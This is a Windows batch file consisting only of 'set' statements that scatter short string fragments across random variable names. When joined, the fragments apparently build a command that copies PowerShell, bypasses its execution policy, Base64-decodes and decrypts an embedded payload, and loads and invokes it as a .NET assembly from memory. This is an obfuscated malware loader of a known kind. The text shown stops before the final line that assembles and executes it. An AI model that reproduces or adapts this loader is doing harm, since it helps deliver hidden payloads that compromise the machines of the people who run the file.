@echo off
set "njQCyYAPYA=we"
set "kwlYMZfKEC= C"
set "DIZtDBMlZj=we"
set "ygEvBTVBng=ws"
set "ziamHvhpHX=co"
set "cBjGGPNYCh=.e"
set "pYabiYegeV=s\"
set "zrnnaWJGNT=he"
set "IVKrwPzsrC=Sy"
set "TUdqDkChks=do"
set "YcyEACqigH=0\"
set "kaZEmFMNvF=po"
set "oUbfXXeTyn= /"
set "wQBDtQmQpW=\W"
set "WJlZypQLYQ=1."
set "UfqsCiBQsN=Po"
set "JlseTRqkZn=Wi"
set "yQngllQeup=in"
set "LgQrEWAlRb=:\"
set "ZyLjMlAnSY=st"
set "poRnuNDKNv=he"
set "ofFWxrlREs=rS"
set "YPWEZtMtIw=32"
set "ILOxPQhlSZ=ll"
set "cYkKpQjSdR=py"
set "tOkggVWCCC=xe"
set "fWHxZcWbzI=nd"
set "JxfGXhVFpb=em"
set "pxLflViSfs=ow"
set "CcqtDOmVfC=ll"
set "gKCdRPAtUk=\v"
set "SqRamXiGHl=y "
set "avmbbelXDo=rs"
set "OciLrezzCO=cd"
set "oJTggIxPKJ= %~dp0"
set "wGrWrCWALV=em.C"
set "TMIiDDNwXb=BC;$"
set "wKwMpiAKPl=rtS4"
set "hOKxxGkjnm=gXyw"
set "RlsXEXyRjI=ewLi"
set "nRpflTQVJo=RBZb"
set "jRlcupargd=-ep "
set "GmkLHzUNeU=7;$L"
set "LEClqFSfWj=Syst"
set "qWiIxDEvzr=.Ass"
set "kUrOnLnwAn=J = "
set "StRfTMncdk=; };"
set "YLxGMLwEFf=pDZz"
set "XkIhvHKvvr=Disp"
set "xEXqQkALWI=tem."
set "IjUOuBDMUf=GrAJ"
set "uqoMVMwNpA=zRfB"
set "wIsvzMPPhg=[Env"
set "BQxcAynflk=oryS"
set "utrqxmMMcJ=yTo("
set "fwBqtJdFej=16] "
set "mebcOUxCPy=onve"
set "xyhUlLFpme= [Sy"
set "sbEnathLHl=raph"
set "UDmzISQaYo=-4] "
set "tVzvSWJgNj=Invo"
set "pMcsgJOjSz=d.En"
set "NTLwOrQTLW=ct S"
set "wjaVpnMgLa=tS46"
set "jCAXovrbQQ=O.Me"
set "IShDTElkLq= [st"
set "XAjbynHTRe=LwnU"
set "CMYjUAmLIm=New-"
set "alwciojpxm=.Cop"
set "FOybhqrhVE=$VvU"
set "ObhpfjdFWV=am;$"
set "EyOFZSBhBU= [Sy"
set "UGyRIbQqBx=tsWi"
set "UwtBdDuIDy=Secu"
set "KoAGEGCGjz=lit("
set "zxaiMdjOSS=rans"
set "eTAegPgURk=ss -"
set "nMKWjiTNSn=ment"
set "GMCTEbVqUl=e = "
set "bCDpSAyZHn=.Dis"
set "nEPEUGFYHI=UD.I"
set "UYNXNmbqCF=isfL"
set "lgCxveExxR=);$p"
set "ipMOUJhgmV=-Obj"
set "JsvxjKlfAP=wnUD"
set "MKiedISKzd=join"
set "GDeXmuXvEW=AJ ="
set "GCjVYiyGUk=ress"
